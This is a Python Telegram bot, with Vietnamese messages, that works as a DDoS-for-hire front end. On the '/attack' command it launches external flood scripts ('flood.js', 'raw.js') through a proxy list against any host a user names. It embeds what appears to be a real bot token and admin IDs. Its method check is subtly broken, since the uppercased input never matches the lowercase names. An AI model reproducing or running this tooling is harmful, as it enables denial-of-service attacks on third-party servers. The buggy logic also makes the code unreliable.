import telebot
import datetime
import time
import os
import subprocess
import psutil
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading

bot_token = '7465158632:AAHFunpF4tslRk3UYEYDHwgAm8O0uIbMrLA'

bot = telebot.TeleBot(bot_token)

allowed_group_id = -1002147382586

allowed_users = []
processes = []
ADMIN_ID = 6885521657
proxy_update_count = 0
last_proxy_update_time = time.time()

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now
def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()
    
@bot.message_handler(commands=['start', 'help'])
def help(message):
    help_text = '''
- /attack + [methods] + [host]
- /methods : List Methods
'''
    bot.reply_to(message, help_text)
    

@bot.message_handler(commands=['methods'])
def methods(message):
    help_text = '''
List Methods :
Layer 7
*https
*tls
Layer 4
*tcp
'''
    bot.reply_to(message, help_text)

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 90:
                cmd_process.terminate()
                bot.reply_to(message, "Đã Dừng Lệnh Tấn Công. Cảm Ơn Bạn Đã Sử Dụng.")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['attack'])
def attack_command(message):

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Vui Lòng Nhập Đúng Cú Pháp.\nVí Dụ : /attack + [method] + [host] + [port]')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 150:
        remaining_time = int(150 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Vui Lòng Đợi {remaining_time} Giây Trước Khi Sử Dụng Lại Lệnh.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    if method in ['https', 'tls']:
        # Update the command and duration based on the selected method
        if method == 'https':
            command = ["node", "flood.js", "GET", host, "90", "7", "90", "proxy.txt"]
            duration = 90
        if method == 'tls':
            command = ["node", "raw.js", host, "90", "90", "10", "proxy.txt", "FLOOD"]
            duration = 90

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        bot.reply_to(message, f'Attack By : @{username} \nHost : {host} \nMethods : {method} \nTime : {duration} Giây')
    else:
        bot.reply_to(message, 'Phương Thức Tấn Công Không Hợp Lệ.')

@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, 'Lệnh Không Hợp Lệ. Vui Lòng Sử Dụng Lệnh /help Để Xem Danh Sách Lệnh.')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)
